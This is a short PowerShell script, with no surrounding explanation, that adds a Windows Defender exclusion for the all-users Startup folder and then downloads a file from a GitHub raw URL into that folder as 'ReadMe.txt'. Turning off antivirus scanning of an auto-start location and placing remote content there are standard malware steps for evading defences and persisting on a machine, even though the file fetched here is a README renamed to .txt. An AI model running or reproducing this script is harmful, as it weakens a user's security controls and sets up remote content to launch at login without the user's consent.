Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"; 
$ProcName = "ReadMe.txt"
$WebFile = "https://raw.githubusercontent.com/LeviTheSkriptKiddie/LeviTheSkriptKiddie/main/README.md"
(New-Object System.Net.WebClient).DownloadFile($WebFile,"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\$ProcName")
